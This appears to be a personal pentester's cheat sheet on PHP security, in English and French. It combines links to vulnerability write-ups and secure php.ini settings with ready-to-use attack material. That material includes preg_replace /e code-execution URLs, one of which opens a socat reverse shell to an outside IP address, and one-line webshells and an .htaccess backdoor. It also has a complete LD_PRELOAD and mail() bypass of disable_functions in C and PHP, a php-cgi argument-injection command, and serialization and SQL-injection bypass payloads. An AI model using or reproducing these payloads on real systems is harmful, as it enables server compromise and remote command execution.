# php

# badass past vulns
https://github.com/80vul/phpcodz

# simple php standalone web server
php -S localhost:8000 -t public_html/

# operator == (type confusion)
https://habnab.it/php-table.html
http://gynvael.coldwind.pl/?id=492
https://docs.google.com/spreadsheets/d/1oWsmTvEZcfgc_1QkBczNGA3Gcffg_pmgKcak7iZldUw/pub?output=html

# magic hashes
https://www.whitehatsec.com/blog/magic-hashes/

# integer key truncation
https://www.sektioneins.de/blog/15-08-03-php_challenge_2015_solution.html
bug: converting 4294967296 (0x100000000) to 32-bit is 0 so different arrays compare identical: ["4294967296 "=>"5" , "1"=>"mypw"] === ["0"=>"5","1"=>"mypw"] => true
and also changing POST json ["1234","seb","oldpw","newpw"] to {"4294967296":"1234","1":"seb","2":"oldpw","3":"newpw"} will update pw of uid account 0
because "update users set pw='${input[3]}' where uid='${input[0]}'") => update ... where uid='' (same as uid=0) because $input[0] => NULL (on unpatched php versions)

# configuration audit hardening
https://www.sektioneins.de/en/blog/14-08-21-php-secure-configuration-checker.html

# determiner la version
form.php?=PHPE9568F34-D428-11d2-A769-00AA001ACF42
form.php?=PHPE9568F35-D428-11d2-A769-00AA001ACF42

http://www.0php.com/php_easter_egg.php

# see what modules are enabled
php -m

# opcache bypass write restrictions to webroot by overwrite cached index.php.bin
http://blog.gosecure.ca/2016/04/27/binary-webshell-through-opcache-in-php-7/

# preg_replace
preg_replace($_GET["find"], $_GET["replace"], $unknown); exploit with find=//e&replace=`ls`

preg_replace($_GET['ville'], $_GET['ville'], urldecode($_SERVER['REQUEST_URI']));
curl 'http://10.0.0.1/demo/preg_replace.php?ville=`socat+exec:sh+tcp:10.10.220.211:8888`/e%00'
curl 'http://10.0.0.1/demo/preg_replace.php?ville=print+2;%23/e%00'
curl 'http://10.0.0.1/demo/preg_replace.php?ville=%23(.*)|%0aeval($_GET\[3\]);%23/e%00&3=system(%22id%22);' 

preg_replace('/' . $_GET['find'] . '/i', $_GET['replace'], $unknown) -> ?find=blah/e%00 PHP>=5.4.6 do not allow null byte in preg_replace anymore

PHP since 7.0 doesn't allow code execution in preg_replace at all

# unserialize RCEs
http://vagosec.org/2013/09/wordpress-php-object-injection/
http://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/

# unserialize / object injection 101
http://securitycafe.ro/2015/01/05/understanding-php-object-injection/
http://www.slideshare.net/_s_n_t/php-unserialization-vulnerabilities-what-are-we-missing
https://websec.wordpress.com/2014/12/08/magento-1-9-0-1-poi/ (the guy who makes RIPS) and http://ebrietas0.blogspot.fr/2015/08/magento-bug-bounty-1-2-csrf-to-code.html

# lulz
PCRE_REPLACE_EVAL has been deprecated as of PHP 5.5.0
NULL byte poisoning was fixed as of PHP 5.3.4

# security best practice
http://thisinterestsme.com/php-best-practises/
http://stackoverflow.com/questions/3115559/exploitable-php-functions

# static analysis
http://rips-scanner.sourceforge.net/

# pour ne pas renvoyer le X-Powered-By: PHP/5.2.9 dans les entetes HTTP
expose_php = Off

# magic quotes gpc (formation HSC)
gpc=get post cookie

application systematique de la fonction addslashes sur les var GET POST COOKIE
magic_quotes_gpc ne fait rien d'autre que d'appeler addslashes (qui n'echape que ', ", NUL).
ph34r les caractères multi-octets 

meme activé, sqli reste possible si
- entier: WHERE id = $GET["id"]
- app err: WHERE url = '".urldecode($GET["url"])

C'est l'application qui doit valider les entrées. 
+ is_int + intval, is_float ...
+ whitelist (in_array, regex)
+ mysql_real_escape_string
+ sql prepared statements (client-side ou server-side): plus besoin d'appeler mysql_real_escape et cie

# (int) ou intval()
intval fait au mieux eg. 123abc => 123
vaut mieux faire is_int puis (int) sinon renvoyer 0

# configuration secure
display_errors = Off
error_reporting = E_ALL
log_error = On
#error_log
html_errors = Off
register_globals = Off
register_argc_argv
variables_order = "GPCS"
session.use_trans_sid = 0
session.use_only_cookies = 1
session.use_trans_sid = 0
session.cookie_lifetime = 7200
session.auto_start = 0
session.cache_limiter = nocache
session.cookie_httponly = 1
session.bug_compat_42 = 0

# filters
<?php include "data://text/plain;base64,PHNjcmlwdD5hbGVydCgwKTwvc2NyaXB0Pgo="; ?>

# backdoors / webshells
* htaccess
<Files ~ "^.ht.*$">
order deny,allow
allow from all
</Files>
AddType application/x-httpd-php .htaccess
AddHandler x-httpd-php .htaccess
php_flag engine on
#<?phpinfo();?>

* extract
@extract($_REQUEST);
@die($ctime($atime));
http://...?ctime=system&atime=id

* simple
<?php $_GET['a']($_GET['b']); ?>

# build httpd + php with support for mysql, oci and mssql
~/code/src/php-5-3.10 $ ./configure  --prefix=/opt/m/php/php-5.3.10 --with-apxs2=/opt/m/httpd/httpd-2.4.1/bin/apxs --with-oci8=shared,/u01/app/oracle/product/11.2.0/xe --with-mysql=mysqlnd --with-mssql=/home/seb/code/src/freetds-0.91/opt/

# php tricks
# http://www.php.net/manual/en/ini.list.php
# http://www.php.net/manual/en/configuration.changes.php
print_r(ini_get_all());
ini_set('display_errors', '1');

* howto use pcntl_exec
$args = array('-c', $_POST['c']);
print_r($args); // next line would return HTTP 500 without this line (?!)
pcntl_exec('/bin/bash', $args);

* bypass disable_functions by overwriting memory through the procfs - plaidctf-2014 nightmares
http://www.reddit.com/r/netsec/comments/2tyh93/php_disable_functions_procfs_bypass_ru/

* bypass disable_functions via putenv() LD_PRELOAD and mail(). Need to upload .so and .php (see 0ctf-2016 guestbook https://blog.ka0labs.net/post/33/ or alictf-2016 homework https://github.com/tothi/ctfs/tree/master/alictf-2016/homework)
upload a.so:
# compile with gcc -c -fPIC a.c -o a.o && gcc a.o -shared -o a.so
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
int getuid ()
{
  char * en;
  char * buf = malloc(300);
  FILE * a;
  unsetenv( "LD_PRELOAD");
  a = fopen( "/tmp/cmd.txt", "r");
  buf = fgets(buf, 100, a); // or buf = getenv("_evilcmd");
  write(2, buf, strlen(buf)); // optional?
  fclose(a);
  remove("/tmp/cmd.txt");
  rename("/var/www/a.so", "/var/www/b.so"); // shouldnt be required (we already unsetenv)
  buf = strcat(buf, "> /tmp/out.txt");
  system(buf);
  rename( "/var/www/b.so", "/var/www/a.so");// shouldnt be required
  free(buf);
  return 0;
} 
upload blah.php:
<?php putenv("LD_PRELOAD=/var/www/a.so");
  $a = fopen("/tmp/cmd.txt", "w");
  fputs($a, $_GET["cmd"]);
  fclose($a); // or use putenv("_evilcmd=$_GET['cmd']");
  mail("a@example.com", "", "", "");
  $a = fopen("/tmp/out.txt", "r");
  while (!feof($a))
  {$b = fgets($a); echo $b;}
  fclose($a); // or use show_source("/tmp/out.txt");
?>

* bypass __wakeup()
https://bugs.php.net/bug.php?id=72663

requests.get('http://127.0.0.1:1234/?data=' + quote('a:2:{i:0;O:6:"HITCON":3:{s:14:"\x00HITCON\x00method";s:4:"show";s:12:"\x00HITCON\x00args";a:1:{i:0;s:17:"orange\' sqli here";}s:12:"\x00HITCON\x00conn";47:{a:1:{i:0;O:9:"Exception":2:{s:7:"\x00*\x00file";R:4;}}i:1;R:4;}'))

* bypasss verify hostname by parse_url https://bugs.php.net/bug.php?id=73192
parse_url('http://example.com:80#@google.com/')['host'] -> google.com

* bypass parse_url
parse_url('//upload/?/path/to/blah') -> {'host': 'upload?', 'path': '/path/to/blah'}

* bypass preg_match('/^.*information_schema.*$/is', arg)
with arg = "' union select table_name from information_schema.tables#".str_repeat('a', 1000000);

# php-cgi
http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/
http://vuln.lol/path/?-s
curl -v 'http://vuln.lol/path/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input' -d '<?php system("sleep 30");die(); ?>'
http://vuln.lol/cgi-bin/php/...
